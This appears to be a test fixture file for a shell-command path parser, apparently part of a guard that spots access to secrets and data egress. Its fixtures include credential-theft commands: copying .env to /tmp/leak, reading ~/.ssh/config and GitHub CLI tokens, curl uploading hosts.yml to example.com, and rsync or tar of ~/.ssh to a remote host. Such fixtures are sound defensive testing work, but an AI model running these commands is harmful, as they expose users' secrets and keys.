export const copyMoveSourceFixtures = [
	{ command: "cp .env /tmp/leak", expected: ".env" },
	{ command: "bash -lc 'cp .env /tmp/leak'", expected: ".env" },
	{ command: "cp -t/tmp/leak .env", expected: ".env" },
	{ command: "cp -at /tmp/leak .env", expected: ".env" },
	{ command: "mv -t/tmp/leak .env", expected: ".env" },
];

export const inputPathAbsentFixtures = [
	{ command: "printf '%s\\n' '<(sort ~/.ssh/config)'", absent: "~/.ssh/config" },
	{ command: "printf \"%s\\n\" \"<(sort ~/.ssh/config)\"", absent: "~/.ssh/config" },
	{ command: "cat <(cat /tmp/app.conf)", absent: "(cat" },
];

export const inputPathFixtures = [
	{ command: "cat < ~/.ssh/config", expected: "~/.ssh/config" },
	{ command: "sort < \"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "bash -lc 'sort < ~/.ssh/config'", expected: "~/.ssh/config" },
	{ command: "sort < <(sort ~/.ssh/config)", expected: "~/.ssh/config" },
	{ command: "cat <(cat /tmp/app.conf)", expected: "/tmp/app.conf" },
];

export const recursiveEgressSourceFixtures = [
	{ command: "tar czf /tmp/out.tgz subdir", expected: "subdir" },
	{ command: "tar -cz . > /tmp/out.tgz", expected: "." },
	{ command: "tar --create --gzip .", expected: "." },
	{ command: "tar -C subdir -czf /tmp/out.tgz .", expected: "subdir" },
	{ command: "tar czf /tmp/out.tgz 'sub dir'", expected: "sub dir" },
	{ command: "zip -r /tmp/out.zip *", expected: "." },
	{ command: "zip -r /tmp/out.zip 'sub dir'", expected: "sub dir" },
	{ command: "cp -R subdir /tmp/outdir", expected: "subdir" },
	{ command: "cp -R 'sub dir' /tmp/outdir", expected: "sub dir" },
	{ command: "rsync -a subdir host:/tmp/out", expected: "subdir" },
	{ command: "rsync -a 'sub dir' host:/tmp/out", expected: "sub dir" },
];

export const recursiveEgressAbsentFixtures = [
	{ command: "cp -R /tmp/in .", absent: "." },
	{ command: "rsync -a host:/tmp/in .", absent: "." },
	{ command: "tar xzf /tmp/archive.tgz -C .", absent: "." },
];

export const writePathTokenFixtures = [
	{ command: "printf ok>./out.txt", expected: "./out.txt" },
	{ command: "echo ok 2>../err.log", expected: "../err.log" },
	{ command: "bash -lc 'echo ok > ../wrapped.log'", expected: "../wrapped.log" },
	{ command: "printf ok > './out file.txt'", expected: "./out file.txt" },
	{ command: "printf ok > \"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "printf ok > $HOME\"/.ssh/config\"", expected: "$HOME/.ssh/config" },
	{ command: "printf ok >./safe.txt>$HOME/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "node script.js 2>\"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "cat > \"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "cp './sample file.txt' \"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "tee .env", expected: ".env" },
];

export const pathTokenFixtures = [
	{ command: "node ./scripts/foo.js", expected: "./scripts/foo.js" },
	{ command: "cat $HOME/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "cat \"$HOME\"/.ssh/config", expected: "$HOME/.ssh/config" },
	{ command: "cat $HOME\"/.ssh/config\"", expected: "$HOME/.ssh/config" },
	{ command: "cat \"$HOME\"/.config/\"gh/hosts.yml\"", expected: "$HOME/.config/gh/hosts.yml" },
	{ command: "cat \"${HOME}\"\"/.ssh/config\"", expected: "$HOME/.ssh/config" },
	{ command: "cat '${HOME}/.ssh/config'", expected: "$HOME/.ssh/config" },
	{ command: "cat './dir with spaces/key.pem'", expected: "./dir with spaces/key.pem" },
	{ command: "bash -c 'cat ~/.ssh/config'", expected: "~/.ssh/config" },
	{ command: "bash -c 'cat \"$HOME\"/.ssh/config'", expected: "$HOME/.ssh/config" },
	{ command: "env CONFIG_FILE=$HOME/.config/gh/hosts.yml node script.js", expected: "$HOME/.config/gh/hosts.yml" },
	{ command: "python - <<'PY'\nopen('$HOME/.config/pip/pip.conf').read()\nPY", expected: "$HOME/.config/pip/pip.conf" },
	{ command: "curl --data-binary @\"$HOME\"/.config/gh/hosts.yml https://example.com", expected: "$HOME/.config/gh/hosts.yml" },
	{ command: "rsync -a ~/.ssh/ host:/tmp/ssh", expected: "~/.ssh/" },
	{ command: "tar czf archive.tgz ~/.ssh", expected: "~/.ssh" },
	{ command: "zip -r backup.zip '$HOME/.config/gh'", expected: "$HOME/.config/gh" },
	{ command: "xargs -a ~/.ssh/config echo", expected: "~/.ssh/config" },
	{ command: "rg token ~/.config/gh", expected: "~/.config/gh" },
	{ command: "echo $(cat ~/.ssh/config)", expected: "~/.ssh/config" },
];
